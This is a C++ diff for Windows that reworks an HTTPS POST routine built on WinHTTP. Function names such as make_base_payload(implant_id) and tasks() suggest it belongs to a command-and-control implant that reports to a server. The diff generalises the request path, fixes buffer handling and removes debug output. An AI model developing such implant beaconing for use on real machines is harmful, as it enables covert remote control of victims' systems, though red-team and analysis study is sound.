@@ -24,8 +24,8 @@ void tasks()
     }
 }
 
-int makePostRequest(LPCWSTR servername, LPCWSTR postdata){
-    DWORD datalen=wcslen(postdata);
+int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata){
+    DWORD datalen=strlen(postdata);
     HINTERNET httpsession = WinHttpOpen(
         L"GenericAPICaller",
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
@@ -33,7 +33,6 @@ int makePostRequest(LPCWSTR servername, LPCWSTR postdata){
         WINHTTP_NO_PROXY_BYPASS,
         0);
     if(httpsession!=NULL){
-        //std::cout<<"Session Started\n";
         HINTERNET connectsesh = WinHttpConnect(
             httpsession,
             servername,
@@ -41,18 +40,16 @@ int makePostRequest(LPCWSTR servername, LPCWSTR postdata){
             0);
         if (connectsesh != NULL)
         {
-            //std::cout<<"connect \n";
             HINTERNET request = WinHttpOpenRequest(
                 connectsesh,
                 L"POST",
-                L"/post",
+                subdirectory,
                 NULL,
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                 WINHTTP_FLAG_SECURE);
             if (request != NULL)
             {
-                //std::cout<<"request \n";
                 BOOL idrequest = WinHttpSendRequest(
                     request,
                     WINHTTP_NO_ADDITIONAL_HEADERS,
@@ -63,32 +60,25 @@ int makePostRequest(LPCWSTR servername, LPCWSTR postdata){
                     0);
                 if (idrequest == TRUE)
                 {
-                    //std::cout<<"sendrequest \n";
                     BOOL response = WinHttpReceiveResponse(
                         request,
                         NULL);
                     if(response==true)
                     {
-                        //std::cout<<"receiveresponse \n";
                         DWORD bytesneeded;
                         BOOL query= WinHttpQueryDataAvailable(
                         request,
                         &bytesneeded);
-                        //char *returnbuffer = (char *)malloc((size_t)bytesneeded);
-                        LPSTR returnbuffer=new char[(bytesneeded+1)];
+                        LPSTR returnbuffer=new char[bytesneeded+1];
                         if(query==TRUE){
                             if(returnbuffer){
                                 ZeroMemory(returnbuffer, bytesneeded+1);
-                                std::cout<<"Returnbuffer created.";
-                                std::cout<<"queryavailable \n";
                                 BOOL dataread=WinHttpReadData(
                                 request,
                                 returnbuffer,
-                                16,
+                                bytesneeded+1,
                                 NULL);
                                 if(dataread==TRUE){
-                                    //std::cout<<"dataread \n";
-                                    std::cout << returnbuffer;
                                     return 0;
                                 }
                             }
@@ -139,8 +129,5 @@ char *make_base_payload(char *implant_id)
 
 int main(int argc, char *argv[])
 {
-
-
-
 return 0;
 }
